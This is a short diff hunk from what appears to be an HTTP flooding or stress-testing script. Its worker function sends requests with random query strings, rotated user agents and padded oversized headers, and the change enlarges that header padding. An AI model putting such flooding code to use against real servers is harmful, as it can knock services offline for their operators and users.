@@ -24,7 +24,7 @@ def worker(ip, i, stop_event):
             headers = f"GET /?{random.randint(0, 1500)} HTTP/1.1\r\n"
             headers += f"Host: {ip}\r\n"
             headers += f"User-Agent: {random.choice(USER_AGENTS)}\r\n"
-            headers += "X-Custom-Header: " + "A" * 5000 + "\r\n"
+            headers += "X-Custom-Header: " + "A" * 6000 + "\r\n"
             headers += "\r\n"
 
             payload = "payload=" + "B" * 2000
